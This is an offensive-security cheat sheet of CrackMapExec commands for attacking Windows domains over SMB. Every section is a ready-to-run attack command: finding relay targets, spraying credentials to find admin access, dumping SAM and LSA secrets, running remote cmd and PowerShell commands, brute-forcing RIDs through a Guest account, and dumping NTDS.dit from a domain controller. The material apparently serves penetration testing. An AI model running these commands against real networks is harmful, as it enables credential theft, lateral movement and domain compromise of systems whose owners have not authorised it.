# CrackMapExec

### Find ip/hostname/SMB Signinig/etc:

```bash
crackmapexec smb targets.txt
```

### Generate a list of SMB Signing disabled for relays

```bash
crackmapexec smb targets.txt --gen-relay-list relay.txt
```

### Find hosts user can log into/is admin on

```bash
crackmapexec smb targets.txt -u user -p 'password'
```

### Enumerate shares

```bash
crackmapexec smb ip -u user -p 'password' --shares
```

### Dump SAM

```bash
crackmapexec smb ip -u user -p 'password' --sam
```

### Dump LSA

```bash
crackmapexec smb ip -u user -p 'password' --lsa
```

### Pass cmd

```bash
crackmapexec smb ip -u user -p 'password' -x 'command'
```

### Pass powershell

```bash
crackmapexec smb ip -u user -p 'password' -X 'command'
```

### List users if Guest account is enabled

```bash
crackmapexec smb (ip) -u 'Guest' -p '' --rid-brute
```

### Look at domain admins

```bash
crackmapexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
```

### Look at logged on users

```bash
crackmapexec smb ip -u user -p 'password' --loggedon-users
```

### Look at NTDS.dit - is LOUD - USE WITH CAUTION

```bash
crackmapexec smb dc-ip -u domain-admin-user -p 'password' --ntds
```
